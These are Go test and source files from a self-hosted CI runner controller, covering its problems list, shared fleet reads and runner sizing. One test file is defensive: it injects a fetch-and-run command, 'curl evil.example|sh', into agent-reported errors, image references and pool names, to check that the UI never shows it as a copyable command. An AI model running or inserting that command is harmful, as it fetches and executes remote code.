// Whatever reaches the problems list is sent again each time it differs, so
// two passes that decided the same thing must say it in the same bytes.
func TestTheRentingOffProblemIsTheSameOnEveryPass(t *testing.T) {
	h := newHarness(t)
	h.rentingOffFleet(t)
	first, _ := h.rentingOffProblem(t)
	h.machinePass(t)
	second, ok := h.rentingOffProblem(t)
	if !ok || !reflect.DeepEqual(first, second) {
		t.Fatalf("the problem changed between identical passes:\n%+v\n%+v", first, second)
	}
}

// The detail is built from three independent parts (the providers, the pools
// that would rent, the machines still owned), and each has a corner the
// single-case tests above do not reach: the wording for several providers, the
// cap of three pools so that a large fleet's sentence is not buried, and the
// plural of the machines still paid for.
func TestTheRentingOffDetailCountsProvidersPoolsAndMachines(t *testing.T) {
	queueFor := func(h *harness, label string, n int) {
		for i := 0; i < n; i++ {
			h.deliverJob(jobEvent{Action: "queued", JobID: time.Now().UnixNano(),
				Labels: []string{"self-hosted", label}})
		}
	}
	tests := []struct {
		name   string
		setup  func(t *testing.T, h *harness)
		want   []string
		absent []string
	}{
		{
			name: "two providers are counted rather than named",
			setup: func(t *testing.T, h *harness) {
				h.c.UpdateConfig(func(c *config.Config) { c.Provider.MaxMachines = 10 })
				h.providerRow(t, "lab")
				h.providerRow(t, "attic")
			},
			want: []string{"2 providers are configured, but this controller is not allowed to rent machines, "},
		},
		{
			name: "at most three pools are listed, in name order",
			setup: func(t *testing.T, h *harness) {
				h.c.UpdateConfig(func(c *config.Config) { c.Provider.MaxMachines = 10 })
				inst := h.installation()
				h.providerRow(t, "lab")
				for _, name := range []string{"d-pool", "b-pool", "a-pool", "c-pool"} {
					h.pool(inst, name, "self-hosted", name)
					queueFor(h, name, 1)
				}
			},
			want: []string{
				" Pool zoomies-a-pool would rent 1 machine now. Pool zoomies-b-pool would rent 1 machine now. Pool zoomies-c-pool would rent 1 machine now.",
			},
			absent: []string{"d-pool"},
		},
		{
			name: "several machines still owned are counted in the plural",
			setup: func(t *testing.T, h *harness) {
				h.machineFleet(t)
				queueFor(h, "demo", 2)
				h.machinePass(t)
				h.c.UpdateConfig(func(c *config.Config) { c.Provider.Enabled = false })
			},
			want: []string{"2 machines are still rented, and nothing is draining, deleting or checking them while renting is off."},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			h := newHarness(t)
			tt.setup(t, h)
			h.machinePass(t)

			p, ok := h.rentingOffProblem(t)
			if !ok {
				t.Fatal("no provider.renting_off was raised")
			}
			for _, w := range tt.want {
				if !strings.Contains(p.Detail, w) {
					t.Errorf("detail = %q, want it to contain %q", p.Detail, w)
				}
			}
			for _, a := range tt.absent {
				if strings.Contains(p.Detail, a) {
					t.Errorf("detail = %q, want it not to mention %q", p.Detail, a)
				}
			}
		})
	}
}

package controller

import (
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/agent"
	"github.com/eyupio/zoomies/internal/store"
)

// hostileReport is what an enrolled agent could send in place of an error: a
// command in backticks, for the UI to draw with a copy button.
const hostileReport = "x `curl evil.example|sh` y"

// imaged is the edit that gives a pool the image a row wants, which may be none.
func imaged(image string) func(*store.Pool) {
	return func(p *store.Pool) { p.Image = image }
}

// reportedAs is hostileReport after the backticks have gone, which is how the
// problem has to still say what the agent said.
const reportedAs = "x 'curl evil.example|sh' y"

// failedPrewarm makes a pool's image fail to pull on a host, with the error the
// row wants and the pool as edit leaves it.
func failedPrewarm(t *testing.T, h *harness, edit func(*store.Pool), message string) {
	t.Helper()
	_, pool, host := h.fleet()
	edit(pool)
	if err := h.st.UpdatePool(h.ctx, pool); err != nil {
		t.Fatalf("UpdatePool: %v", err)
	}
	if n, err := h.c.PrewarmPool(h.ctx, pool); err != nil || n != 1 {
		t.Fatalf("PrewarmPool = %d, %v", n, err)
	}
	batch, err := h.c.PollTasks(h.ctx, host.ID, time.Millisecond)
	if err != nil || len(batch.Tasks) != 1 {
		t.Fatalf("PollTasks = %+v, %v", batch, err)
	}
	if err := h.c.ReportResult(h.ctx, host.ID, agent.TaskResult{
		TaskID: batch.Tasks[0].ID, Kind: agent.TaskPrewarmImage, OK: false, Fault: store.FaultImage, Error: message,
	}); err != nil {
		t.Fatalf("ReportResult: %v", err)
	}
}

// What an agent says about itself is as much its own to word as its name was,
// and a problem reaches every signed-in viewer and the MCP tools. The UI draws
// a backtick pair in a problem as a command with a copy button, so an error or
// an image reference carrying one would let an enrolled agent put a command in
// front of an administrator. The row for each is a way text of the agent's
// choosing reaches a sentence.
func TestAProblemNeverLetsTextAnAgentReportedOpenACodeSpan(t *testing.T) {
	for _, row := range []struct {
		name  string
		code  string
		setup func(t *testing.T, h *harness)
		// said is what the problem has to go on saying, in prose: a sentence
		// that dropped the agent's words would be safe and no use to anyone.
		said string
	}{
		{"the error in a runtime report", "host.runtime_recovering", func(t *testing.T, h *harness) {
			h.beat(t, h.host("build01").ID, &agent.RuntimeReport{Failures: 3, Kind: agent.RuntimeUnavailable,
				Error: hostileReport, RetryIn: 40 * time.Second})
		}, reportedAs},
		{"the error a failed pull reports", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged(""), hostileReport)
		}, reportedAs},
		{"an image reference with a backtick pair in it", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("ghcr.io/a`curl evil.example|sh`b:1"), "dial tcp: i/o timeout")
		}, "ghcr.io/a'curl evil.example|sh'b:1"},
		// The registry is read out of the image, up to its first slash, so it is
		// text of the same standing and sits in the title and the fix as well.
		{"a registry read out of an image reference", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("a`curl evil.example|sh`b/x:1"), "dial tcp: i/o timeout")
		}, "a'curl evil.example|sh'b"},
		{"a pool name", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, func(p *store.Pool) { p.Name = "a`curl evil.example|sh`b" }, "dial tcp: i/o timeout")
		}, "pool zoomies-a'curl evil.example|sh'b"},
		{"an image reference that is a command", "host.image_pull_failed", func(t *testing.T, h *harness) {
			failedPrewarm(t, h, imaged("ghcr.io/a:1;curl evil.example|sh"), "dial tcp: i/o timeout")
		}, "ghcr.io/a:1;curl evil.example|sh"},
		// A line break lets a report start a line of its own in the middle of a
		// sentence, and an escape does the same to a terminal reading the log.
		{"an error with a line break and an escape in it", "host.runtime_recovering", func(t *testing.T, h *harness) {
			h.beat(t, h.host("build01").ID, &agent.RuntimeReport{Failures: 1, Kind: agent.RuntimeTimeout,
				Error: "line one\nline two\x1b[0m", RetryIn: 40 * time.Second})
		}, "line one line two [0m"},
	} {
		t.Run(row.name, func(t *testing.T) {
			h := newHarness(t)
			row.setup(t, h)

			p := h.problem(t, row.code)
			for field, text := range map[string]string{"title": p.Title, "detail": p.Detail, "fix": p.Fix} {
				for _, m := range codeSpans.FindAllStringSubmatch(text, -1) {
					if strings.Contains(m[1], "evil.example") {
						t.Errorf("%s %s: the agent's text opens a code span (%q): %s", p.Code, field, m[1], text)
					}
				}
			}
			if !strings.Contains(p.Detail+" "+p.Fix, row.said) {
				t.Errorf("%s no longer says %q: %+v", p.Code, row.said, p)
			}
		})
	}
}

// Neutralising an agent's words must not take the command the controller offers
// itself. An operator whose registry will not answer copies `docker pull` to see
// the daemon's own reply, and a fix that lost it whenever an error was odd would
// be no fix.
func TestAnImagePullProblemKeepsItsOwnDockerPullCommand(t *testing.T) {
	const image = "ghcr.io/eyupio/zoomies-runner:ubuntu-2404"
	for _, c := range []struct {
		name    string
		message string
	}{
		{"an ordinary error", "dial tcp: i/o timeout"},
		{"an error that carries a command", hostileReport},
	} {
		t.Run(c.name, func(t *testing.T) {
			h := newHarness(t)
			failedPrewarm(t, h, imaged(image), c.message)

			var spans []string
			for _, m := range codeSpans.FindAllStringSubmatch(h.problem(t, "host.image_pull_failed").Fix, -1) {
				spans = append(spans, m[1])
			}
			if got, want := strings.Join(spans, "|"), "docker pull "+image; got != want {
				t.Errorf("code spans in the fix = %q, want exactly %q", got, want)
			}
		})
	}
}

package controller

import (
	"fmt"
	"reflect"
	"slices"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// The problems list is worked out in sections, and the sections of one list share
// a single read of the pools, the hosts and the runners on them (fleet_reads.go).
// The list has to be the same list whether they share or each reads for itself,
// and the sections have to leave the rows they share as they found them.

// problemKeys is a problems list reduced to what it is about, in its order: the
// code, who it is about and how bad it is. The sentences are left out because
// some of them count the time since something, and two lists asked for a moment
// apart can say 59 seconds and a minute.
func problemKeys(ps []Problem) []string {
	out := make([]string, len(ps))
	for i, p := range ps {
		out[i] = fmt.Sprintf("%s|%s|%s|%s", p.Code, p.TargetKind, p.TargetID, p.Severity)
	}
	return out
}

// everythingWrong is a fleet that raises a problem in a good many of the sections:
// pools that are dangerous, share a cache, or have nowhere to run, a host that is
// cordoned, one that stopped reporting, one the controller cannot talk to and one
// that reports no size, runners that failed and runners stuck coming up, jobs
// that wait for pools that cannot run them, and an installation that is not
// working. The clock stands still, so that two lists asked for at once are asked
// for at the same time.
func everythingWrong(t *testing.T) *harness {
	t.Helper()
	now := time.Now().Truncate(time.Second)
	h := newHarnessAt(t, func() time.Time { return now })
	inst := h.installation()

	plain := h.pool(inst, "plain")
	risky := h.pool(inst, "risky")
	risky.DockerMode, risky.Ephemeral = store.DockerHostSocket, false
	shared := h.pool(inst, "widgets")
	shared.Cache = store.CacheConfig{Enabled: true, Scope: store.CacheScopeRepository, Repository: "acme/widgets"}
	nowhere := h.pool(inst, "nowhere", "self-hosted", "linux", "x64", "gpu")
	nowhere.HostSelector = store.StringMap{"gpu": "yes"}
	for _, p := range []*store.Pool{risky, shared, nowhere} {
		if err := h.st.UpdatePool(h.ctx, p); err != nil {
			t.Fatalf("UpdatePool: %v", err)
		}
	}

	healthy := h.host("vm-healthy")
	cordoned := h.host("vm-cordoned")
	if err := h.st.SetHostCordoned(h.ctx, cordoned.ID, true); err != nil {
		t.Fatalf("SetHostCordoned: %v", err)
	}
	silent := &store.Host{Name: "vm-silent", Capacity: 4, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: "amd64", CPUs: 8, MemoryMB: 16 * 1024, LastHeartbeat: now.Add(-3 * time.Hour)}
	unsized := &store.Host{Name: "vm-unsized", Capacity: 4, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: "amd64", LastHeartbeat: now}
	old := &store.Host{Name: "vm-old", Capacity: 4, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: "amd64", CPUs: 8, MemoryMB: 16 * 1024, LastHeartbeat: now}
	for _, host := range []*store.Host{silent, unsized, old} {
		if err := h.st.CreateHost(h.ctx, host); err != nil {
			t.Fatalf("CreateHost: %v", err)
		}
	}
	if err := h.st.SetHostProtocol(h.ctx, old.ID, 1, true); err != nil {
		t.Fatalf("SetHostProtocol: %v", err)
	}

	failed := h.runnerRow(plain, healthy, store.RunnerProvisioning)
	if _, err := h.st.TransitionRunner(h.ctx, failed.ID, store.RunnerFailed, "the image could not be pulled"); err != nil {
		t.Fatalf("TransitionRunner: %v", err)
	}
	h.runnerRow(plain, healthy, store.RunnerProvisioning)
	h.runnerRow(plain, healthy, store.RunnerIdle)
	h.runnerRow(risky, unsized, store.RunnerBusy)
	h.runnerRow(shared, cordoned, store.RunnerIdle)

	for i := range 4 {
		h.deliverJob(jobEvent{Action: "queued", JobID: int64(100 + i), RunID: 50, Labels: []string{"self-hosted", "linux", "x64", "gpu"}})
	}
	h.deliverJob(jobEvent{Action: "queued", JobID: 200, RunID: 51, Labels: []string{"self-hosted", "mystery"}})
	if err := h.st.SetInstallationHealth(h.ctx, inst.ID, "the App is not installed on acme"); err != nil {
		t.Fatalf("SetInstallationHealth: %v", err)
	}
	return h
}

func TestTheProblemsListIsTheSameWhetherItsSectionsShareTheirReadsOrNot(t *testing.T) {
	h := everythingWrong(t)

	shared, err := h.c.Problems(h.ctx)
	if err != nil {
		t.Fatalf("Problems: %v", err)
	}
	alone, err := h.c.Problems(noFleetReads(h.ctx))
	if err != nil {
		t.Fatalf("Problems without sharing: %v", err)
	}
	// The whole of each problem, sentences and all: the clock stands still.
	if !reflect.DeepEqual(shared, alone) {
		t.Errorf("the list differs when its sections share their reads\n shared: %v\n alone:  %v", problemKeys(shared), problemKeys(alone))
	}
	// The comparison says something only if the fleet raised problems in the
	// sections that share: those about pools, those about hosts, and those about
	// the runners on them.
	keys := problemKeys(shared)
	for _, want := range []string{"pool.dangerous", "pool.cache_shared", "host.unhealthy", "host.resources_unknown", "runners.failed", "installation.unhealthy"} {
		if !slices.ContainsFunc(keys, func(k string) bool { return len(k) >= len(want) && k[:len(want)] == want }) {
			t.Errorf("the fleet raised no %s, so the comparison says nothing about the section that does: %v", want, keys)
		}
	}
	if len(shared) < 8 {
		t.Errorf("the fleet raised %d problems; want at least 8 for the comparison to be worth making: %v", len(shared), keys)
	}
}

// The sections read the rows they share and nothing else: a list worked out
// and the figures that follow it leave every pool, host and runner as the store
// has it.
func TestTheRowsTheSectionsShareAreLeftAsTheyWereFound(t *testing.T) {
	h := everythingWrong(t)
	ctx := withFleetReads(h.ctx)

	if _, err := h.c.Problems(ctx); err != nil {
		t.Fatalf("Problems: %v", err)
	}
	if _, err := h.c.Stats(ctx, statsEventWindow); err != nil {
		t.Fatalf("Stats: %v", err)
	}
	if _, err := h.c.UpdatesView(ctx); err != nil {
		t.Fatalf("UpdatesView: %v", err)
	}

	r := readsIn(ctx)
	if !r.pools.done || !r.hosts.done || !r.runners.done {
		t.Fatalf("the sections did not read the pools, the hosts and their runners through the shared reads: %v %v %v", r.pools.done, r.hosts.done, r.runners.done)
	}
	pools, err := h.st.ListPools(h.ctx)
	if err != nil {
		t.Fatalf("ListPools: %v", err)
	}
	if !reflect.DeepEqual(r.pools.val, pools) {
		t.Errorf("a section changed a pool it shared")
	}
	hosts, err := h.st.ListHosts(h.ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if !reflect.DeepEqual(r.hosts.val, hosts) {
		t.Errorf("a section changed a host it shared")
	}
	runners, err := h.st.ListRunnersByHost(h.ctx, store.RunnerIdle, store.RunnerBusy)
	if err != nil {
		t.Fatalf("ListRunnersByHost: %v", err)
	}
	if !reflect.DeepEqual(r.runners.val, runners) {
		t.Errorf("a section changed a runner it shared")
	}
}

// What sharing is for is the reading, and the reading is allocation: the pools
// and the hosts of a fleet decoded again for every section. A list worked out
// with its reads shared allocates well under what it does with each section
// reading for itself.
func TestAProblemsListWithSharedReadsAllocatesWellUnderOneWithout(t *testing.T) {
	h := newHarness(t)
	_, pools := benchPools(h, 20)
	for i := range 10 {
		host := h.host(fmt.Sprintf("vm-%03d", i))
		h.seedRunner(t, pools[i], host, store.RunnerIdle)
	}

	shared := testing.AllocsPerRun(3, func() {
		if _, err := h.c.Problems(h.ctx); err != nil {
			t.Fatalf("Problems: %v", err)
		}
	})
	alone := testing.AllocsPerRun(3, func() {
		if _, err := h.c.Problems(noFleetReads(h.ctx)); err != nil {
			t.Fatalf("Problems without sharing: %v", err)
		}
	})
	if shared > alone*0.6 {
		t.Errorf("a list with its reads shared allocated %.0f times and one without %.0f; want the shared list under 60%% of the other", shared, alone)
	}
}

// The same holds for everything a listener is told after a pass, which is the
// list, the statistics, the update status and the host views together: they read
// the fleet once between them.
func TestTheFiguresAfterAPassAllocateWellUnderTheSameWithoutSharedReads(t *testing.T) {
	h := newHarness(t)
	_, pools := benchPools(h, 20)
	for i := range 10 {
		host := h.host(fmt.Sprintf("vm-%03d", i))
		h.seedRunner(t, pools[i], host, store.RunnerIdle)
	}
	sub := h.listen()
	go func() {
		for range sub.C {
		}
	}()

	shared := testing.AllocsPerRun(3, func() { h.c.publishDerived(h.ctx) })
	alone := testing.AllocsPerRun(3, func() { h.c.publishDerived(noFleetReads(h.ctx)) })
	// The problems list alone, sharing among its own sections, comes to 0.29 of what
	// each reading for itself does; the whole set sharing comes to 0.19.
	if shared > alone*0.25 {
		t.Errorf("the figures after a pass allocated %.0f times with their reads shared and %.0f without; want the shared ones under a quarter of the other", shared, alone)
	}
}

package controller

import (
	"encoding/json"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/provider"
	"github.com/eyupio/zoomies/internal/store"
)

// problemJSON is a problem as the event stream would send it.
func problemJSON(t *testing.T, h *harness, code string) string {
	t.Helper()
	b, err := json.Marshal(findProblem(t, h, code))
	if err != nil {
		t.Fatalf("marshalling %s: %v", code, err)
	}
	return string(b)
}

// The problems list is sent to every open tab only when its JSON differs from
// the last one sent. A problem that carries a count of elapsed seconds, or a
// "since" computed from the clock, differs on every pass for as long as the
// fault stands, so a fleet with one silent host pushed the whole list to every
// subscriber once a second -- and told the operator a warning had been there
// "for an hour" for ever. Each of these is a fault that stands while time
// passes, and time passing must not change what is said about it.
func TestAProblemThatStandsDoesNotChangeWhileTimePasses(t *testing.T) {
	const later = 90 * time.Second

	tests := []struct {
		name  string
		code  string
		setup func(t *testing.T, h *harness) (advance func(time.Duration))
	}{
		{"rejected webhook deliveries", "webhook.rejected", func(t *testing.T, h *harness) func(time.Duration) {
			h.fleet()
			h.deliver("workflow_job", jobEvent{Action: "queued", JobID: 1}.body(), "wrong")
			return h.advance
		}},
		{"a silent host with nothing on it", "host.unhealthy", func(t *testing.T, h *harness) func(time.Duration) {
			_, _, host := h.fleet()
			host.LastHeartbeat = time.Now().Add(-2 * store.HeartbeatTimeout)
			if err := h.st.UpdateHost(h.ctx, host); err != nil {
				t.Fatalf("UpdateHost: %v", err)
			}
			return h.advance
		}},
		{"a silent host with runners on it", "host.unhealthy", func(t *testing.T, h *harness) func(time.Duration) {
			_, pool, host := h.fleet()
			h.runnerRow(pool, host, store.RunnerIdle)
			host.LastHeartbeat = time.Now().Add(-2 * store.HeartbeatTimeout)
			if err := h.st.UpdateHost(h.ctx, host); err != nil {
				t.Fatalf("UpdateHost: %v", err)
			}
			return h.advance
		}},
		{"a queued job no pool claims", "jobs.unmatched", func(t *testing.T, h *harness) func(time.Duration) {
			h.fleet()
			h.deliverJob(jobEvent{
				Action: "queued", JobID: 909,
				Labels:   []string{"self-hosted", "linux", "gpu", "cuda12"},
				QueuedAt: time.Now().Add(-unmatchedGrace - time.Minute),
			})
			return h.advance
		}},
		{"a runner stuck starting up", "runners.not_progressing", func(t *testing.T, h *harness) func(time.Duration) {
			_, pool, host := h.fleet()
			r := h.runnerRow(pool, host, store.RunnerProvisioning)
			at := h.stuck(r.CreatedAt)
			h.c.clock = func() time.Time { return at }
			return func(d time.Duration) { at = at.Add(d) }
		}},
		{"a poller that has stopped sweeping", "poller.stale", func(t *testing.T, h *harness) func(time.Duration) {
			h.cfg.GitHub.PollFallback = true
			h.cfg.GitHub.PollInterval = 30 * time.Second
			h.c.lastPollAt.Store(h.c.Now().UnixNano())
			h.advance(3 * time.Minute)
			return h.advance
		}},
		{"a delete the provider has not confirmed", "provider.delete_pending", func(t *testing.T, h *harness) func(time.Duration) {
			_, row := h.machineFleet(t)
			m := h.readyMachine(t, row)
			h.beginDrainFor(t, m)
			h.fake.SetFailure("delete", provider.FailureUnreachable, "dial tcp: i/o timeout")
			h.machinePass(t)
			h.advance(h.cfg.Provider.DeleteTimeout + time.Minute)
			return h.advance
		}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			h := newHarness(t)
			advance := tc.setup(t, h)
			before := problemJSON(t, h, tc.code)
			advance(later)
			if after := problemJSON(t, h, tc.code); after != before {
				t.Errorf("%s changed as time passed:\n before: %s\n  after: %s", tc.code, before, after)
			}
		})
	}
}

package controller

import (
	"fmt"
	"slices"
	"strings"

	"github.com/eyupio/zoomies/internal/config"
	"github.com/eyupio/zoomies/internal/scheduler"
	"github.com/eyupio/zoomies/internal/store"
)

// A runner's size is decided from three places -- the fleet's runners.*
// settings, the host's runner profile and the pool -- and an operator reading a
// number needs to know which of them it came from before they know where to
// change it. These views carry each figure with its source, in the vocabulary
// scheduler.SourcePool, SourceHost and SourceGlobal, with an empty source
// meaning that nobody has said and the figure is zero.

// RunnerSizeView is a CPU and memory figure, as the API renders one.
type RunnerSizeView struct {
	CPUs     float64 `json:"cpus"`
	MemoryMB int64   `json:"memory_mb"`
}

// EffectiveSizeView is one tier of a host's effective profile: the figure in
// force on each field, and whose it is.
type EffectiveSizeView struct {
	CPUs           float64 `json:"cpus"`
	MemoryMB       int64   `json:"memory_mb"`
	CPUsSource     string  `json:"cpus_source,omitempty"`
	MemoryMBSource string  `json:"memory_mb_source,omitempty"`
}

// EffectiveStandardView is the standard tier, which carries the most CPU one
// runner may be lent as well.
type EffectiveStandardView struct {
	EffectiveSizeView
	BurstMaxCPUs       float64 `json:"burst_max_cpus,omitempty"`
	BurstMaxCPUsSource string  `json:"burst_max_cpus_source,omitempty"`
	// BurstMaxMemoryMB is the most memory one runner here may hold, lent memory
	// included, and BurstMaxMemoryMBSource whose it is. Absent where the host
	// names none, which leaves a pool's own ceiling, or half as much again as a
	// runner's guarantee.
	BurstMaxMemoryMB       int64  `json:"burst_max_memory_mb,omitempty"`
	BurstMaxMemoryMBSource string `json:"burst_max_memory_mb_source,omitempty"`
}

// EffectiveProfileView is what a runner on a host is held to, with the fleet's
// setting standing in wherever the host says nothing. It is what the host's
// own form shows beside the fields an operator can edit, so that an empty field
// reads as "follows the fleet's 2 CPU" rather than as nothing.
type EffectiveProfileView struct {
	Minimum  EffectiveSizeView     `json:"minimum"`
	Standard EffectiveStandardView `json:"standard"`
}

// sourced picks a figure and says whose it is: the host's where it set one, the
// fleet's where it did not, and nobody's -- zero, and an empty source -- where
// neither did.
func sourced[T float64 | int64](host, global T) (T, string) {
	switch {
	case host > 0:
		return host, scheduler.SourceHost
	case global > 0:
		return global, scheduler.SourceGlobal
	}
	return 0, ""
}

// EffectiveProfile resolves h's runner profile against the fleet's settings: the
// host's own figure on each field it names, and runners.minimum_* and
// runners.default_* where it does not.
//
// A host's minimum that follows the fleet is shown as such, but a pool that
// sets a minimum of its own still wins over the fleet's for the runners it
// places there: the host's own figure is a floor under the pool's, and the
// fleet's is only the answer the pool follows when it says nothing.
func EffectiveProfile(h *store.Host, fleet config.Runners) EffectiveProfileView {
	var out EffectiveProfileView
	min, std := h.RunnerProfile.Minimum, h.RunnerProfile.Standard
	out.Minimum.CPUs, out.Minimum.CPUsSource = sourced(min.CPUs, fleet.MinimumCPUs)
	out.Minimum.MemoryMB, out.Minimum.MemoryMBSource = sourced(min.MemoryMB, fleet.MinimumMemoryMB)
	defaultCPUs, defaultMemoryMB := fleet.DefaultRunnerSize()
	out.Standard.CPUs, out.Standard.CPUsSource = sourced(std.CPUs, defaultCPUs)
	out.Standard.MemoryMB, out.Standard.MemoryMBSource = sourced(std.MemoryMB, defaultMemoryMB)
	out.Standard.BurstMaxCPUs, out.Standard.BurstMaxCPUsSource = sourced(std.BurstMaxCPUs, 0)
	out.Standard.BurstMaxMemoryMB, out.Standard.BurstMaxMemoryMBSource = sourced(std.BurstMaxMemoryMB, 0)
	return out
}

// hostSlots says how many runners the host takes before any throttle and which
// limit sets that, so the host's card can say "capacity 4 is below the 6 its
// machine holds" instead of leaving an operator to find out why a host with a
// standard size runs fewer runners than it should.
//
// The limit is empty where there is no standard to derive from, and where the
// capacity and the machine agree.
func hostSlots(h *store.Host) (slots int, limitedBy string) {
	slots = h.Slots()
	std := h.RunnerProfile.Standard
	if !std.Sized() || h.Capacity <= 0 {
		return slots, ""
	}
	alloc := h.Allocatable()
	byCPU, byMemory := h.Capacity, h.Capacity
	if std.CPUs > 0 && alloc.CPUsKnown {
		byCPU = int((alloc.CPUs + 1e-6) / std.CPUs)
	}
	if std.MemoryMB > 0 && alloc.MemoryKnown {
		byMemory = int(alloc.MemoryMB / std.MemoryMB)
	}
	switch {
	case slots < h.Capacity && byCPU <= byMemory:
		return slots, "cpu"
	case slots < h.Capacity:
		return slots, "memory"
	case h.Capacity < min(byCPU, byMemory):
		// The machine holds more than the operator lets it take.
		return slots, "capacity"
	}
	return slots, ""
}

// PoolHostSizing is how one pool is sized on one host, with where each figure
// came from. It is the row an operator reads to see why a runner of this pool
// on that host is the size it is, and what they would change to move it.
type PoolHostSizing struct {
	// Standard is what one runner of the pool is given there: the pool's own
	// figure, the host's standard (or the fleet's default standing in for it)
	// for a pool that takes its size from the host, or one slot's share.
	Standard               RunnerSizeView `json:"standard"`
	StandardCPUsSource     string         `json:"standard_cpus_source,omitempty"`
	StandardMemoryMBSource string         `json:"standard_memory_mb_source,omitempty"`
	// Floor is the least a runner is given there: the larger of the pool's
	// minimum -- its own, or the fleet's where it follows it -- and the host's.
	Floor               RunnerSizeView `json:"floor"`
	FloorCPUsSource     string         `json:"floor_cpus_source,omitempty"`
	FloorMemoryMBSource string         `json:"floor_memory_mb_source,omitempty"`
	// Ceiling is the most CPU one runner may use there, its guarantee and a
	// loan together, for a pool that lends CPU: the smaller of the pool's and
	// the host's. Zero is "as much as the host's allocatable CPU".
	CeilingCPUs   float64 `json:"ceiling_cpus,omitempty"`
	CeilingSource string  `json:"ceiling_source,omitempty"`
	// CeilingMemoryMB is the same for the memory valve: the most memory one
	// runner may hold there, its guarantee and what it is lent together, for a
	// pool that has the valve on. CeilingMemorySource says whose figure it is --
	// the pool's, the host's (the smaller of the two applies), or "default" for
	// half as much again as the runner's guarantee.
	CeilingMemoryMB     int64  `json:"ceiling_memory_mb,omitempty"`
	CeilingMemorySource string `json:"ceiling_memory_source,omitempty"`
}

// poolHostSizing resolves one pool on one host. raw is the pool as stored and p
// the copy the fleet sizes it by (sizingPool): the figures come from the copy
// and the sources from the pair, because a minimum the copy inherited is
// indistinguishable from the pool's own once it is there.
func poolHostSizing(raw, p *store.Pool, h *store.Host, fleet config.Runners) PoolHostSizing {
	var out PoolHostSizing
	charge := scheduler.Reserve(p, h)
	out.Standard = RunnerSizeView{CPUs: charge.CPUs, MemoryMB: charge.MemoryMB}
	stdCPUs, stdMemory := scheduler.StandardSize(p, h)
	hostStd := h.RunnerProfile.Standard
	switch {
	case p.SizeFromProfile:
		out.StandardCPUsSource = standardSource(stdCPUs, hostStd.CPUs > 0)
		out.StandardMemoryMBSource = standardSource(float64(stdMemory), hostStd.MemoryMB > 0)
	default:
		// Typed on the pool, or one slot's share of the host.
		out.StandardCPUsSource, out.StandardMemoryMBSource = scheduler.SourceHost, scheduler.SourceHost
		if raw.Resources.CPUs > 0 {
			out.StandardCPUsSource = scheduler.SourcePool
		}
		if raw.Resources.MemoryMB > 0 {
			out.StandardMemoryMBSource = scheduler.SourcePool
		}
	}

	poolCPUs, poolMemory := EffectiveMinimum(raw.Resources, fleet)
	poolCPUSource, poolMemorySource := scheduler.SourcePool, scheduler.SourcePool
	if raw.Resources.MinCPUs <= 0 {
		poolCPUSource = scheduler.SourceGlobal
	}
	if raw.Resources.MinMemoryMB <= 0 {
		poolMemorySource = scheduler.SourceGlobal
	}
	hostMin := h.RunnerProfile.Minimum
	out.Floor.CPUs, out.FloorCPUsSource = poolCPUs, orNone(poolCPUs, poolCPUSource)
	if hostMin.CPUs > poolCPUs {
		out.Floor.CPUs, out.FloorCPUsSource = hostMin.CPUs, scheduler.SourceHost
	}
	out.Floor.MemoryMB, out.FloorMemoryMBSource = poolMemory, orNone(float64(poolMemory), poolMemorySource)
	if hostMin.MemoryMB > poolMemory {
		out.Floor.MemoryMB, out.FloorMemoryMBSource = hostMin.MemoryMB, scheduler.SourceHost
	}

	if p.CPUBurst.Observes() {
		pool, host := p.CPUBurst.MaxCPUs, hostStd.BurstMaxCPUs
		out.CeilingCPUs = scheduler.BurstLimit(p, h)
		switch {
		case pool > 0 && host > 0 && host < pool:
			out.CeilingSource = scheduler.SourceHost
		case pool > 0:
			out.CeilingSource = scheduler.SourcePool
		case host > 0:
			out.CeilingSource = scheduler.SourceHost
		}
	}
	if p.MemoryBurst.Observes() {
		pool, host := p.MemoryBurst.MaxMemoryMB, hostStd.BurstMaxMemoryMB
		out.CeilingMemoryMB = scheduler.MemoryCeiling(p, h, charge.MemoryMB)
		switch {
		case pool > 0 && host > 0 && host < pool:
			out.CeilingMemorySource = scheduler.SourceHost
		case pool > 0:
			out.CeilingMemorySource = scheduler.SourcePool
		case host > 0:
			out.CeilingMemorySource = scheduler.SourceHost
		default:
			out.CeilingMemorySource = "default"
		}
	}
	return out
}

// standardSource is the source of one field of a profile pool's standard: the
// host's own where its profile names it, the fleet's default where it does
// not, and the host's slot share -- which is the host's -- where not even the
// fleet's default was carried.
func standardSource(figure float64, fromHost bool) string {
	switch {
	case fromHost:
		return scheduler.SourceHost
	case figure > 0:
		return scheduler.SourceGlobal
	}
	return scheduler.SourceHost
}

// orNone is a source for a figure that may be zero: zero is nobody's.
func orNone(figure float64, source string) string {
	if figure <= 0 {
		return ""
	}
	return source
}

// profileProblems are the two things a runner profile can leave an operator
// without a way to see: a pool that has hosts and no host it can use, and a
// pool that takes its size from the host onto a host that gives it none.
//
// Both are asked of the pools and the hosts as they stand, and neither is
// raised for a fleet that has not used a profile: the first only where some
// host is kept off a pool by one, and the second only for a pool that asked to
// be sized by the host. That is what keeps the list the same on upgrade.
func profileProblems(hosts []*store.Host, pools []*store.Pool, fleet config.Runners) []Problem {
	var out []Problem
	for _, p := range pools {
		if p == nil || !p.Enabled || len(hosts) == 0 {
			continue
		}
		if prob, ok := noEligibleHostProblem(hosts, p); ok {
			out = append(out, prob)
		}
		if prob, ok := profileDefaultProblem(hosts, p, fleet); ok {
			out = append(out, prob)
		}
	}
	return out
}

// maxListedHosts keeps a sentence about a hundred hosts readable.
const maxListedHosts = 8

// noEligibleHostProblem is the pool that no host could ever run, where at least
// one host is left out by a runner profile. Each host is named with the limit
